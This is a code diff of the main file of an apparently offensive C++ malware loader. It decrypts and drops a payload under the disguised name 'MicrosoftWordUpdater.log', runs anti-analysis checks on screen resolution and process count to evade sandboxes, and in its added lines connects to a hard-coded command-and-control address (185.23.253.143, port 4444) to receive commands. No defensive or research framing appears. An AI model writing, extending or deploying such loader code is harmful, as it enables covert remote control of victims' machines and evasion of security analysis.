@@ -1,7 +1,8 @@
+#include <iostream>
+#include "ABCsync.h"
 #include "ABCloader.h"
 #include "AntiAnalysis.h"
-#include "Encryption.h"  // Make sure to include this
-#include <iostream>
+#include "Encryption.h"
 
 int main() {
     // Initialize the loader to decrypt and load the payload
@@ -9,21 +10,22 @@ int main() {
     std::cout << "[*] Running ABCloader..." << std::endl;
     loader.runLoader();
 
-    // Start anti-analysis techniques
+    // Start anti-analysis techniques (screen resolution, process count, etc.)
     AntiAnalysis antiAnalysis;
     std::cout << "[*] Running anti-analysis techniques..." << std::endl;
-    if (!antiAnalysis.runAntiAnalysis()) {
-        std::cerr << "[!] Anti-analysis failed! Exiting." << std::endl;
+    if (!antiAnalysis.checkScreenResolution() || !antiAnalysis.checkProcessCount()) {
+        std::cerr << "[!] Anti-analysis check failed. Exiting..." << std::endl;
         return 1;
     }
 
-    // Decrypt and write the payload to a specific location
-    Encryption encryption;  // Ensure encryption object is declared
-    std::string outputPath = "C:\\Users\\johnj\\Documents\\MicrosoftWordUpdater.log";
-    //std::string outputPath = "C:\\Users\\AppData\\Local\\Microsoft\\Edge\\User Data\\Synchronize\\MicrosoftWordUpdater.log";
-    std::cout << "[*] Decrypting and writing data..." << std::endl;
-    if (!encryption.decryptDataAndWrite(outputPath)) {
-        std::cerr << "[!] Failed to write decrypted payload!" << std::endl;
+    // Connect to the C2 server and listen for commands
+    ABCsync syncPayload;
+    std::string c2Address = "185.23.253.143";  // Example C2 address
+    int c2Port = 4444;  // Example C2 port
+
+    std::cout << "[*] Connecting to C2 server at " << c2Address << ":" << c2Port << std::endl;
+    if (!syncPayload.connectToC2(c2Address, c2Port)) {
+        std::cerr << "[!] Failed to connect to C2 server." << std::endl;
         return 1;
     }
 
